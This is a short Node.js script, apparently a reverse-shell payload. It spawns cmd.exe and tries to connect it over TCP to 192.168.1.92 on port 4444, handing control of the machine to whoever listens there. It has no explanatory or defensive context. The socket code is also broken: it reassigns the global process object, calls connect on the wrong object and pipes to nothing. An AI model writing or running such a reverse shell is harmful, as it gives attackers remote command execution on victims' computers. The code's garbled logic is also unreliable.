let ip_address = "192.168.1.92";
let port = 4444;
let { execSync } = require("child_process");
let path = require("path");
const { env } = require("process");

(function basicShell(payload) {
  const net = require("net");
  process = require("child_process");
  shell = process.spawn("cmd.exe", []);

  const client = new net.Socket();
  process.connect(ip_address, port, function (onConnect) {
    client.pipe();
    shell.stdout.pipe(process);
    shell.stderr.pipe(process);
  });
})();
